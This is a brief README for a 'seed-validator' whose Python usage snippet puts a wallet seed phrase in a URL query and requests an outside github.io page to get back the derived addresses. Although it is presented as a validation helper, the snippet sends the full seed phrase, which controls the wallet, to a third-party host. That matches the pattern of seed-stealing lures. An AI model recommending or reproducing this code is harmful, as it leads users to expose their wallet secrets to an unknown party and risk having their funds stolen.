# seed-validator
Python usage:

```python
from requests_html import HTMLSession

s = HTMLSession()
phrase = "floor miracle question text area crumble theory vault squirrel square harbor rough" # seed phrase
cnt = "1" # amount of addresses from phrase
coin = "ETH" # coin symbol (ETH, BTC, BCH, LTC, TRX only available)
r = s.get(f'https://cryptowallettools.github.io/seed-validator/seed-validator-json.html?seed={phrase}&cnt={cnt}&coin={coin}', timeout=5)

r.html.render()

result = r.html.find('#addresses', first=True)

print(result.text)
```
